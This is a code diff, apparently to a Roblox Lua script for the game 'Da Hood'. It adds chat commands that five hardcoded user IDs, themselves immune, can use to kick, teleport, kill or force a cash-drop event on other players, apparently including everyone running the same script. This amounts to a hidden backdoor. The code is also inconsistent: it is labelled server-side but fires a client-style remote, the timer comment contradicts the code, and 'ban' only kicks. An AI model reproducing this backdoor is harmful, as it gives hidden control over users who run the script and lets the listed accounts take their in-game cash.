@@ -4790,133 +4790,123 @@ for _, Player in pairs(Players:GetPlayers()) do
 end
 
 
-local modTable = {3499991340, 7379734175, 508001, 667796, 417844508}
+-- Server-Side Command Script for Da Hood
+-- Features: Specific UserIDs can use chat commands on other players
+-- Command prefix: :
+-- Commands: kick, ban, bring, reset, dropcash, shield
 
--- Function to check if a player is a mod
-local function isMod(player)
-    return table.find(modTable, player.UserId) ~= nil
+local userIdTable = {3499991340, 7379734175, 508001, 667796, 417844508} -- Add user IDs here
+local shieldedUsers = {3499991340, 7379734175, 508001, 667796, 417844508} -- Store shielded user IDs
+
+-- Function to check if a user ID is valid
+local function isValidUser(userId)
+    for _, id in ipairs(userIdTable) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
 end
 
--- Table to keep track of frozen players
-local frozenPlayers = {}
+-- Function to check if a user ID is shielded
+local function isShielded(userId)
+    for _, id in ipairs(shieldedUsers) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
 
--- Function to find a player by username or display name
-local function findPlayerByName(name)
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Name:sub(1, #name):lower() == name:lower() or player.DisplayName:sub(1, #name):lower() == name:lower() then
+-- Function to find player by display name or partial name
+local function findPlayerByDisplayNameOrPartial(displayName)
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player.DisplayName:lower():sub(1, #displayName) == displayName:lower() or
+           player.Name:lower():sub(1, #displayName) == displayName:lower() then
             return player
         end
     end
     return nil
 end
 
--- Function to perform actions on all players with the script executed
-local function performActionOnAll(action)
-    for _, player in pairs(game.Players:GetPlayers()) do
-        if player.Character then
-            action(player)
+-- Function to execute commands
+local function executeCommand(command, targetPlayer, player)
+    local maxCashDrop = 10000 -- Assume this is the max amount of cash you can drop
+
+    if isShielded(targetPlayer.UserId) then return end
+
+    if command == "kick" then
+        targetPlayer:Kick("You've been kicked from the game.")
+    elseif command == "ban" then
+        targetPlayer:Kick("You've been banned from the game.")
+    elseif command == "bring" and player.Character and targetPlayer.Character then
+        targetPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
+    elseif command == "reset" and targetPlayer.Character then
+        targetPlayer.Character:BreakJoints() -- This will reset the player's character
+    elseif command == "dropcash" then
+        game.ReplicatedStorage.MainEvent:FireServer("DropMoney", maxCashDrop)
+    elseif command == "block" then
+        if not isShielded(player.UserId) then
+            table.insert(shieldedUsers, player.UserId)
+            print(player.Name .. " has been shielded.")
+        else
+            print(player.Name .. " is already shielded.")
         end
     end
 end
 
--- Command handling function
-local function onChatMessage(player, message)
-    if isMod(player) then
-        local command, targetName = message:match("^(%S+)%s*(.*)")
+-- Function to handle chat commands
+local function onChatted(msg, player)
+    if not isValidUser(player.UserId) then return end
 
-        -- Check for commands
-        if command == ":kick" then
-            if targetName == "." then
-                performActionOnAll(function(targetPlayer)
-                    targetPlayer:Kick("You have been kicked by a moderator.")
-                end)
-                print(player.Name .. " kicked all players.")
-            else
-                local targetPlayer = findPlayerByName(targetName)
-                if targetPlayer then
-                    targetPlayer:Kick("You have been kicked by a moderator.")
-                    print(player.Name .. " kicked " .. targetPlayer.Name)
-                else
-                    player:SendChatMessage("Player not found.")
+    local command = msg:match("^:([%w_]+)")
+    local targetName = msg:match("^:[%w_]+%s*(.*)$")
+
+    if command then
+        if targetName == "" then
+            -- Apply the command to everyone using the script
+            for _, targetPlayer in ipairs(game.Players:GetPlayers()) do
+                if targetPlayer ~= player and targetPlayer:FindFirstChildOfClass("PlayerGui") then
+                    executeCommand(command, targetPlayer, player)
                 end
             end
-
-        elseif command == ":bring" then
-            if targetName == "." then
-                performActionOnAll(function(targetPlayer)
-                    targetPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
-                end)
-                print(player.Name .. " brought all players.")
-            else
-                local targetPlayer = findPlayerByName(targetName)
-                if targetPlayer then
-                    targetPlayer.Character:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
-                    print(player.Name .. " brought " .. targetPlayer.Name)
-                else
-                    player:SendChatMessage("Player not found.")
-                end
-            end
-
-        elseif command == ":freeze" then
-            if targetName == "." then
-                performActionOnAll(function(targetPlayer)
-                    targetPlayer.Character.Humanoid.WalkSpeed = 0
-                    frozenPlayers[targetPlayer.UserId] = true
-                end)
-                print(player.Name .. " froze all players.")
-            else
-                local targetPlayer = findPlayerByName(targetName)
-                if targetPlayer then
-                    targetPlayer.Character.Humanoid.WalkSpeed = 0
-                    frozenPlayers[targetPlayer.UserId] = true
-                    print(player.Name .. " froze " .. targetPlayer.Name)
-                else
-                    player:SendChatMessage("Player not found.")
-                end
-            end
-
-        elseif command == ":unfreeze" or command == ":thaw" then
-            if targetName == "." then
-                performActionOnAll(function(targetPlayer)
-                    if frozenPlayers[targetPlayer.UserId] then
-                        targetPlayer.Character.Humanoid.WalkSpeed = 16 -- Default WalkSpeed
-                        frozenPlayers[targetPlayer.UserId] = nil
-                    end
-                end)
-                print(player.Name .. " unfroze/thawed all players.")
-            else
-                local targetPlayer = findPlayerByName(targetName)
-                if targetPlayer and frozenPlayers[targetPlayer.UserId] then
-                    targetPlayer.Character.Humanoid.WalkSpeed = 16 -- Default WalkSpeed
-                    frozenPlayers[targetPlayer.UserId] = nil
-                    print(player.Name .. " unfroze/thawed " .. targetPlayer.Name)
-                else
-                    player:SendChatMessage("Player not found or not frozen.")
-                end
-            end
-
-        elseif command == ":re" or command == ":reset" then
-            if targetName == "." then
-                performActionOnAll(function(targetPlayer)
-                    targetPlayer:LoadCharacter() -- Reset the player
-                end)
-                print(player.Name .. " reset all players.")
-            else
-                local targetPlayer = findPlayerByName(targetName)
-                if targetPlayer then
-                    targetPlayer:LoadCharacter() -- Reset the player
-                    print(player.Name .. " reset " .. targetPlayer.Name)
-                else
-                    player:SendChatMessage("Player not found.")
-                end
+        else
+            -- Apply the command to the specific target
+            local targetPlayer = findPlayerByDisplayNameOrPartial(targetName)
+            if targetPlayer then
+                executeCommand(command, targetPlayer, player)
             end
         end
     end
 end
 
--- Connect the chat message event
-game.Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
+-- Connect PlayerAdded event
+game.Players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        onChatted(msg, plr)
     end)
+end)
+
+-- Connect for existing players
+for _, plr in pairs(game.Players:GetPlayers()) do
+    plr.Chatted:Connect(function(msg)
+        onChatted(msg, plr)
+    end)
+end
+
+-- Function to check online users and print to console
+local function checkOnlineUsers()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if isValidUser(player.UserId) then
+            print(player.Name .. " is online")
+        end
+    end
+end
+
+-- Check for online users every 10 seconds
+spawn(function()
+    while true do
+        wait(120)
+        checkOnlineUsers()
+    end
 end)
